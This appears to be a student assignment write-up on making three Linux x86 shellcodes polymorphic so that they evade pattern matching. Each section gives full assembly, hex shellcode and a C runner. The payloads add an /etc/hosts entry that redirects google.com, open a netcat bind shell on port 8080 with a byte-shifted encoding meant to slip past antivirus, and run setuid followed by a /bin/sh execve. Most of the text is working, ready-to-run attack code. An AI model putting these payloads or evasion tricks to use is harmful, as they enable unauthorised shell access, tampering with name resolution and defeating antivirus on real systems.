### Assignment Six:

1. Take up 3 shellcodes from Shell--Storm and create polymorphic versions of them to beat pattern matching
2. The polymorphic versions cannot be larger 150% of the existing shellcode
3. Bonus points for making it shorter in length than original

### Linux/x86 - Add map in /etc/hosts file - 77 bytes
http://shell-storm.org/shellcode/files/shellcode-893.php

After inspected the shellcode, I thought to myself, why don't I just use another jmp call pop to the address storing /etc/hosts to ebx? As such, I created this polymorphic version of shellcode which have the same length as the original one. Notice that I put the new _load_name: under _load_data: instead is because put the new function above cannot terminate the file name properly. Causing the systemcall not able to open the file. Another point to notice is that do not include any word that has the word "file" in it. It seems that the objdump bash code that help us to extract shellcode will trim away any code with this word in it. This actually cause my shellcode fail to execute when I convert it to the c program. So, lesson learnt, know what you tools really do is very important.

Below is the polymorphic version of my shellcode
```
global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	mov al, 0x5
	push ecx
	;push 0x7374736f	    ;/etc///hosts
	;push 0x682f2f2f
	;push 0x6374652f
	jmp short _load_name	;We will use another jmp call pop to replace it instead

_open:
	;mov ebx, esp
	pop ebx	
	mov cx, 0x401		    ;permmisions
	int 0x80		        ;syscall to open file

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data	;jmp-call-pop technique to load the map

_write:
	pop ecx
	;push 20		;length of the string, dont forget to modify if changes the map
	;pop edx
	mov dl, 20		;edx remain 0x0 at this point
	int 0x80		;syscall to write in the file

	push 0x6
	pop eax
	int 0x80		;syscall to close the file

	push 0x1
	pop eax
	int 0x80		;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"

_load_name:			;Original named _load_file, which cause the objdump bash strip away the opcode
	call _open
	hosts db "/etc/hosts"
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\xeb\x35\x5b\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x0f\x59\xb2\x14\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xec\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\xe8\xc6\xff\xff\xff\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

The length of the shellcode is the same as original. After we execute it, a new entry was added to the hosts file.

### Linux/x86 - netcat bindshell port 8080 - 75 bytes
http://shell-storm.org/shellcode/files/shellcode-684.php

For this shellcode, I decrease every byte by one and increase them when the shellcode runs. This should avoid anti virus from trying look of the argument, /bin/nc -lp 8080 -e /bin/sh from passing to execve

```
global _start

section .text

_start:
	jmp short _netcat
_execve:
	pop esi
	;xor eax,eax
	xor ecx, ecx
	mul ecx
	mov cl, 26
	mov edi, esi
incbyte:
	mov dl, byte[edi]	;increase the value byte by byte
	inc edx
	mov byte[edi], dl
	inc edi
	loop incbyte
	mov [esi+0x7],al
	mov [esi+0xf],al
	mov [esi+0x19],al
	mov [esi+0x1a],esi
	lea ebx,[esi+0x8]
	mov [esi+0x1e],ebx
	lea ebx,[esi+0x10]
	mov [esi+0x22],ebx
	mov [esi+0x26],eax
	mov al,0xb
	mov ebx,esi
	lea ecx,[esi+0x1a]
	lea edx,[esi+0x26]
	int 0x80

_netcat:
	call _execve
	;execute db "/bin/nc#-lp8080#-e/bin/sh"
	execute db 0x2e,0x61,0x68,0x6d,0x2e,0x6d,0x62,0x22,0x2c,0x6b,0x6f,0x37,0x2f,0x37,0x2f,0x22,0x2c,0x64,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67,0x22
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x38\x5e\x31\xc9\xf7\xe1\xb1\x1a\x89\xf7\x8a\x17\x42\x88\x17\x47\xe2\xf8\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xc3\xff\xff\xff\x2e\x61\x68\x6d\x2e\x6d\x62\x22\x2c\x6b\x6f\x37\x2f\x37\x2f\x22\x2c\x64\x2e\x61\x68\x6d\x2e\x72\x67\x22";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

The shellcode is 89 bytes long, which is 18.6% larger than the original

### Linux/x86 - setuid(); execve(); exit(); - 44 bytes
http://shell-storm.org/shellcode/files/shellcode-549.php

For the last shellcode, I decided to use the method that I demonstrated in assignment 2, using SHL to manipulate the value. Since SHL will set bits to 0 after the original bit got shifted to left, we can use this to replace xor. We also can separate the value being push to parts so that it will be hard to figure out the pattern.

```
global _start

section .text

_start:
	;xor eax,eax
	;xor ebx,ebx
	SHL ebx, 0x10		;shift all values to left, result in 00000000
	SHL ebx, 0x10		;Sadly SHL didn't accept 0x20 (32bits) so we have to seperate them
	;xor ecx,ecx
	SHL ecx, 0x10
	SHL ecx, 0x10		;shift all values to left, result in 00000000
	mul ebx
	mov al,0x17
	int 0x80
	xor eax,eax
	push eax

	;push dword 0x68732f6e	
	mov dx, 0x6873		;Instead of pushing the whole word, we push to by parts and use SHL to adjust
	SHL edx, 16
	mov dx, 0x2f6e
	push edx
	
	;push dword 0x69622f2f
	mov dx, 0x6962		;Instead of pushing the whole word, we push to by parts and use SHL to adjust
	SHL edx, 16
	mov dx, 0x2f2f
	push edx

	mov ebx,esp
	lea edx,[esp+0x8]
	push eax
	push ebx
	lea ecx,[esp]
	mov al,0xb
	int 0x80
	xor eax,eax
	mov al,0x1
	int 0x80
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xc1\xe3\x10\xc1\xe3\x10\xc1\xe1\x10\xc1\xe1\x10\xf7\xe3\xb0\x17\xcd\x80\x31\xc0\x50\x66\xba\x73\x68\xc1\xe2\x10\x66\xba\x6e\x2f\x52\x66\xba\x62\x69\xc1\xe2\x10\x66\xba\x2f\x2f\x52\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

The size of the shellcode is 66 bytes long, which is exactly 50% larger than the original one.
